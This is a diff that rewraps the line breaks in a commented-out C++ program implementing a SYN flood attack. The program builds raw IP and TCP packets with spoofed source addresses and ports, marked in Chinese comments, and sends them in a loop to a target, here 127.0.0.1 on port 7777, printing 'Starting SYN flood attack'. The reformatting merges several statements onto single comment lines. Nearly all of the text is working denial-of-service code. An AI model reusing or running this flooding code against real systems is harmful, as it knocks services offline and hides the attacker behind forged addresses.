@@ -45,7 +45,8 @@
 
 //     // 设置套接字选项以自己构造 IP 头部
 //     int optval = 1;
-//     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0) {
+//     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) <
+//     0) {
 //         perror("Error setting IP_HDRINCL");
 //         close(sock);
 //         exit(EXIT_FAILURE);
@@ -74,17 +75,16 @@
 //         ip_header->version = 4;
 //         ip_header->ihl = 5;
 //         ip_header->tos = 0;
-//         ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
-//         ip_header->id = htons(rand() % 65535);
-//         ip_header->frag_off = 0;
-//         ip_header->ttl = 64;
-//         ip_header->protocol = IPPROTO_TCP;
-//         ip_header->saddr = htonl((192 << 24) | (168 << 16) | (ip_dist(gen) << 8) | ip_dist(gen)); // 伪造源 IP
-//         ip_header->daddr = target_addr.sin_addr.s_addr;
+//         ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct
+//         tcphdr)); ip_header->id = htons(rand() % 65535); ip_header->frag_off
+//         = 0; ip_header->ttl = 64; ip_header->protocol = IPPROTO_TCP;
+//         ip_header->saddr = htonl((192 << 24) | (168 << 16) | (ip_dist(gen) <<
+//         8) | ip_dist(gen)); // 伪造源 IP ip_header->daddr =
+//         target_addr.sin_addr.s_addr;
 
 //         // TCP 头部
-//         struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
-//         tcp_header->source = htons(port_dist(gen)); // 伪造源端口
+//         struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct
+//         iphdr)); tcp_header->source = htons(port_dist(gen)); // 伪造源端口
 //         tcp_header->dest = htons(target_port);
 //         tcp_header->seq = htonl(0);
 //         tcp_header->ack_seq = 0;
@@ -95,14 +95,18 @@
 //         tcp_header->urg_ptr = 0;
 
 //         // 计算校验和
-//         tcp_header->check = calculate_checksum((unsigned short *)tcp_header, sizeof(struct tcphdr));
+//         tcp_header->check = calculate_checksum((unsigned short *)tcp_header,
+//         sizeof(struct tcphdr));
 
 //         // 发送包
-//         if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
-//                    (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
+//         if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct
+//         tcphdr), 0,
+//                    (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0)
+//                    {
 //             perror("Packet send failed");
 //         } else {
-//             std::cout << "Packet " << i + 1 << " sent to " << target_ip << ":" << target_port << std::endl;
+//             std::cout << "Packet " << i + 1 << " sent to " << target_ip <<
+//             ":" << target_port << std::endl;
 //         }
 //     }
 
@@ -112,6 +116,7 @@
 //     const char *target_ip = "127.0.0.1";
 //     int target_port = 7777;
 
-//     std::cout << "Starting SYN flood attack on " << target_ip << ":" << target_port << "..." << std::endl;
-//     syn_flood(target_ip, target_port, ATK_NUM);
+//     std::cout << "Starting SYN flood attack on " << target_ip << ":" <<
+//     target_port << "..." << std::endl; syn_flood(target_ip, target_port,
+//     ATK_NUM);
 // }
